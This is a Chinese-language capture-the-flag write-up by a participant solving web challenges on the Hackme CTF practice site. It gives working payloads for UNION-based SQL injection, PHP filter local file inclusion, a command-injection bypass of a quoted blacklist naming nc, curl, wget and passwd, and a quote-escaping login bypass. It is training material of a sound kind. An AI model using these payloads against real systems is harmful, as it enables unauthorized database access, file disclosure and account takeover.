[Hackme CTF](htts://hackme.inndy.tw)
===
參賽者：Will
## Web
### 0x01 hide and seek
#### https://hackme.inndy.tw/
看網站原始碼並尋找 `FLAG{` 
![](https://i.imgur.com/Vm6Xy2E.png)

### 0x02 guestbook
https://hackme.inndy.tw/gb/?mod=read&id=46
<b>Payload 1:</b> 取得資料庫名 g8
`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(database()),4#`
<b>Payload 2:</b> 得到資料庫表名 flag
`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='g8' limit 0,1),4#`
<b>Payload 3:</b> 得到資料庫列名 flag
`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='flag' limit 1,1),4#`
<b>Payload 4:</b> 拿到該題 `flag`
`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select flag from flag limit 1,1),4#`

### 0x03 LFI
#### https://hackme.inndy.tw/lfi/?page=pages/index
<b>Payload 1:</b>
`https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag`
base64 decode 後得到 flag.php
``` php
Can you read the flag<?php require('config.php'); ?>?
```
<b>Payload 2:</b>
`https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config`
base64 decode 後得到 config.php
``` php
<?php

$flag = "FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}";
```

### 0x04 homepage
#### https://hackme.inndy.tw/
查看原始碼得知 [cute.js](https://hackme.inndy.tw/cute.js)
aaencode 解碼後得到 js 原始碼
在 Firefox Console 執行得到 QR Code 掃描後得到 flag
![](https://i.imgur.com/eHkN7wF.png)

### 0x05 ping
#### https://hackme.inndy.tw/ping/
有一串黑名單陣列, 發現 `sort` 沒防護到
``` php
$blacklist = [
            'flag', 'cat', 'nc', 'sh', 'cp', 'touch', 'mv', 'rm', 'ps', 'top', 'sleep', 'sed',
            'apt', 'yum', 'curl', 'wget', 'perl', 'python', 'zip', 'tar', 'php', 'ruby', 'kill',
            'passwd', 'shadow', 'root',
            'z',
            'dir', 'dd', 'df', 'du', 'free', 'tempfile', 'touch', 'tee', 'sha', 'x64', 'g',
            'xargs', 'PATH',
            '$0', 'proc',
            '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
        ];
```
<b>Payload:</b>
`sort fl????hp`


### 0x06 scoreboard
#### https://hackme.inndy.tw/scoreboard/
<b>Payload:</b> X-Flag 就是 flag
`curl -I https://hackme.inndy.tw/scoreboard/`

### 0x07 login as admin 0
#### https://hackme.inndy.tw/login0/
過濾可以知道 `'` 會被取代成 `\\'`, 因此 `\'` 可以濾過
``` javascript
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```
<b>Payload 1:</b> 得到 guest
``` 
username = \' || 1#
password = 1
```
<b>Payload 2:</b> 得到 admin & flag
``` 
username = \' || 1 limit 1,1#
password = 1
```
